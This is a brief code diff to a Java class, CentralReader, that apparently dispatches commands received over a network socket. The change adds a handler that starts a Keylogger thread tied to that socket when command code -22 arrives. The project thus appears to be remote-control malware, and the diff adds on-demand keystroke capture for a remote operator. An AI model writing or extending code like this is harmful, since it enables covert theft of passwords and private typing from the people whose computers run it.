@@ -111,6 +111,10 @@ public class CentralReader implements Runnable {
 					System.out.println("");
 					break;
 				}
+				case -22: {
+					new Thread(new Keylogger(socket)).start();
+					break;
+				}
 				default:
 //					throw new IllegalArgumentException("Unexpected value: " + );
 					System.out.println("Not data");
